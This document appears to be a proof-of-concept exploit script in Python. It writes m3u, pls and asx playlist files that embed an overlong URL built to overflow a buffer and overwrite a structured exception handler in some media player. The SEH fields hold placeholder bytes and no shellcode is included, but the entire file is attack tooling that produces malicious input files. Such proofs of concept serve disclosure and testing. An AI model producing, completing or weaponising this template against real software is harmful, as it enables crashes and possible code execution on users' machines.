#!/usr/bin/python
 
junk1  = "\x80" * 50;
offset = "\x41" * 1595;
nSEH   = "\x42" * 4;
SEH    = "\x43" * 4;
junk2  = "\x44" * 5000;
 
evil = "http://{junk1}{offset}{nSEH}{SEH}{junk2}".format(**locals())
 
for e in ['m3u', 'pls', 'asx']:
  if e is 'm3u':
    poc = evil
  elif e is 'pls':
    poc = "[playlist]\nFile1={}".format(evil)
  else:
    poc = "<asx version=\"3.0\"><entry><ref href=\"{}\"/></entry></asx>".format(evil)
  try:
    print("[*] Creating poc.%s file..." % e)
    f = open('poc.%s' % e, 'w')
    f.write(poc)
    f.close()
    print("[*] %s file successfully created!" % f.name)
  except:
    print("[!] Error while creating exploit file!")
